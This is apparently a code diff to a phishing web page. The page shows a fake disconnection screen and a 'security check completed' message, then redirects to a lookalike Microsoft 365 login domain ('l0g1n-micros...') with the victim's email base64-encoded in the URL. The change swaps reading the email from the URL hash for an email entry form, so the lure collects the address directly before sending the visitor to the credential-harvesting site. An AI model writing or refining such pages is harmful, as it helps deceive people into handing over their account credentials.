@@ -33,6 +33,10 @@
             display: block;
         }
 
+        .email-container {
+            margin-top: 20px;
+        }
+
         .security-check {
             display: none;
             margin-top: 1rem;
@@ -56,6 +60,14 @@
         <div class="image-container">
             <img src="https://pbs.twimg.com/media/GGrR89_WgAAgrOI?format=jpg&name=large" alt="Simulating Disconnection...">
         </div>
+        
+        <!-- Email input field -->
+        <div class="email-container">
+            <label for="email">Enter your email:</label>
+            <input type="email" id="email" placeholder="name@example.com">
+            <button id="submitBtn">Submit</button>
+        </div>
+
         <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
     </div>
 
@@ -63,36 +75,12 @@
         (function() {
             'use strict';
 
-            function getEmailFromHash() {
-                try {
-                    const hash = window.location.hash.substr(1);
-                    return atob(hash);
-                } catch (error) {
-                    console.error("Failed to extract email from hash:", error);
-                    return null;
-                }
-            }
-
             function isValidEmail(email) {
                 const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                 return emailPattern.test(email);
             }
 
-            function populateEmail() {
-                const email = getEmailFromHash();
-                if (email && isValidEmail(email)) {
-                    const emailField = document.getElementById("email");
-                    if (emailField) {
-                        emailField.value = email;
-                    } else {
-                        console.warn("Email field not found.");
-                    }
-                } else {
-                    alert("Invalid email format detected.");
-                }
-            }
-
-            function simulateDisconnection() {
+            function simulateDisconnection(email) {
                 console.log("Simulating disconnection for 10 seconds...");
 
                 setTimeout(() => {
@@ -104,21 +92,27 @@
                     }
 
                     setTimeout(() => {
-                        const email = getEmailFromHash();
-                        if (isValidEmail(email)) {
-                            const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365" + window.location.hash.substr(1);
-                            console.log("Redirecting to: " + redirectTo);
-                            window.location.href = redirectTo;
-                        } else {
-                            alert("Invalid email. Redirect canceled.");
-                        }
-                    }, 3000);
-                }, 5000);
+                        const encodedEmail = btoa(email); // Encoding email to pass in URL
+                        const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365" + encodedEmail;
+                        console.log("Redirecting to: " + redirectTo);
+                        window.location.href = redirectTo;
+                    }, 6000);
+                }, 10000);
             }
 
             window.onload = function() {
-                simulateDisconnection();
-                setTimeout(populateEmail, 5000);
+                const submitBtn = document.getElementById("submitBtn");
+
+                submitBtn.addEventListener("click", function() {
+                    const emailField = document.getElementById("email");
+                    const email = emailField.value;
+
+                    if (isValidEmail(email)) {
+                        simulateDisconnection(email);
+                    } else {
+                        alert("Please enter a valid email address.");
+                    }
+                });
             };
         })();
     </script>
